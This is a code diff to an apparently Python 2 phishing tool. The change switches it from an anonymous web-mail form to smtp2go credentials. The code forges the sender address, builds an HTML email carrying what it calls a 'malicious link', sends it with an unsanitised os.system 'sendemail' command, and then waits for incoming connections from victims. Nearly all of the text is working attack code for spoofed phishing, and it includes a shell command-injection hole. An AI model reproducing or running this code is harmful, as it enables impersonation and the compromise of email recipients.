@@ -15,6 +15,7 @@
 #import yagmail
 #import smtplib
 #import email
+import subprocess
 import socket
 import ConfigParser
 import mimetypes
@@ -57,12 +58,13 @@ def setup ():
 
 	# Setup the config file
 	global targetEmail
-	#global spoofName
-	#global email
-	#global password
+	global spoofEmail
+	global smtpGoEmail
+	global smtpGoPass
+	global smtpGoServer
 	global subject
 	global message
-	global emailImage
+	global goodByeName
 	global fbusername
 	global fbpassword
 	global fbmessage
@@ -72,9 +74,11 @@ def setup ():
 	configParser = ConfigParser.RawConfigParser()	
 	configParser.read('config')
 	targetEmail = configParser.get('Config', 'targetEmail')
-	#spoofName  = configParser.get('Config', 'spoofName')
-	#email    = configParser.get('Config', 'email')
-	#password = configParser.get('Config', 'password')
+	spoofEmail  = configParser.get('Config', 'spoofEmail')
+	smtpGoEmail    = configParser.get('Config', 'smtpGoEmail')
+	smtpGoPass = configParser.get('Config', 'smtpGoPass')
+	smtpGoServer = configParser.get('Config', 'smtpGoServer')
+	goodByeName = configParser.get('Config', 'goodByeName')
 	subject = configParser.get('Config', 'subject')
 	message = configParser.get('Config', 'message')
 	fbuser = configParser.get('Config', 'fbuser')
@@ -92,13 +96,13 @@ def setup ():
 			global isUsingMessenger
 
 			# Validate the input.
-			if (targetEmail == 'None'):
-				color_print('[!] Please setup your config file.', color='red')	
+			if (goodByeName == 'None' or targetEmail == 'None' or spoofEmail == 'None' or smtpGoEmail == 'None' or smtpGoPass == 'None' or smtpGoServer == 'None'):
+				color_print('[!] Please setup your config file. make sure you create an account at https://www.smtp2go.com', color='red')	
 				return
 			else:
 				# Connects to the server.
 				isUsingMessenger = False
-				sendMailUsingMechanize()
+				sendMail(smtpGoServer, targetEmail, spoofEmail, smtpGoEmail, smtpGoPass, subject, message, goodByeName)
 		else:
 			# Validate the input.
 			if (fbusername == 'None' or fbpassword == 'None' or fbmessage == 'None' or fbuserID == 'None'):
@@ -153,30 +157,7 @@ def sendToMessenger():
 #
 # Connects to the smtp server.
 #
-def sendMailUsingMechanize():
-
-	# get the smtp server via user input.
-	color_print("[+] Getting everything ready.", color='blue')
-	br = mechanize.Browser()
-	url = "http://anonymouse.org/anonemail.html"
-	headers = "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)"
-	br.addheaders = [('User-agent', headers)]
-	br.open(url)
-	br.set_handle_equiv(True)
-	br.set_handle_gzip(True)
-	br.set_handle_redirect(True)
-	br.set_handle_robots(False)
-	br.set_debug_http(False)
-	br.set_debug_redirects(False)
-
-	# Get the link
-	link = getLink()
-
-
-	br.select_form(nr=0)
-	br.form['to'] = targetEmail
-	br.form['subject'] = subject
-	br.form['text'] = message + '\n\n' + link
+def sendMail(server, toAddr, spoofAddr, username, password, subject, message, goodBye):
 	# attempt to connect to the stmp server.
 	try:
 			
@@ -185,25 +166,27 @@ def sendMailUsingMechanize():
 
 		try:
 
-
+			# Get the link
+			link = getLink()
 			# Print out a thew important messages.
-			color_print("[+] Sending email to.. " + targetEmail, color='blue')
+			color_print("[+] Sending email to.. " + toAddr, color='blue')
 			time.sleep(2)
-			color_print("[+] Spoofing email.. ", color='blue')
+			color_print("[+] Spoofing email.. " + spoofAddr, color='blue')
 			time.sleep(2)
 			color_print("[*] Sending malicious link..", color='yellow')
 			time.sleep(1)
 
+			MessageFile = open('message.html', 'w')
+			MessageFile.write("""
+"""+message+"""
+<br></br>
+<a href="""+link+""">"""+link+"""</a>
+<br>"""+goodBye+"""</br>
+</html>""")
+			MessageFile.close()
 			# Send the mail.
-			results = br.submit()
-			response = br.response().read()
-				
-			if "The e-mail has been sent anonymously!" in response:
-				color_print('The email has been sent successfully\n It may tak a while for the recipient to receive it', color='green')
-				listenForConnections()
-				
-			else:
-				color_print("[!] Failed to send email", color='red')
+			os.system("sendemail -f " + spoofAddr + " -t " + toAddr + " -u " + subject + " -o message-content-type=html -o message-file=message.html " + " -xu " + username + " -xp " + password + " -s " + server)		
+			listenForConnections()
 		except KeyboardInterrupt:
 			color_print("Thanks, Happy hacking", color='blue')
 		
